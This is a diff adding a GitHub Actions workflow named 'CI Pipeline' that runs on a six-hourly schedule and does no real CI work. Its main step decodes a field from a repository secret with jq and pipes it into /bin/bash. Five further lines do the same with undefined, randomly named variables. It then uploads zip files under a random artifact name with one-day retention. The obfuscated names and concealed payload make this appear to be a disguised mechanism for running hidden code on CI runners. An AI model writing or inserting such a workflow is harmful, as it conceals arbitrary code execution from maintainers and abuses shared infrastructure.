@@ -1,0 +1,35 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          puu643: ${{ secrets.puu643 }}
+        run: |
+          printf '%s' "$puu643" | jq -r .iuyfu6 | /bin/bash
+          printf '%s' "$dy03745" | jq -r .cge014 | /bin/bash
+          echo $xqu7 | jq -r .uizcv7594 | /bin/bash
+          printf '%s' "$dz6" | jq -r .gxg74399 | /bin/bash
+          printf '%s' "$okjii05" | jq -r .nkhpn42 | /bin/bash
+          echo $arg9 | jq -r .uy5 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: ARuG5sib
+          path: "*.zip"
+          retention-days: 1
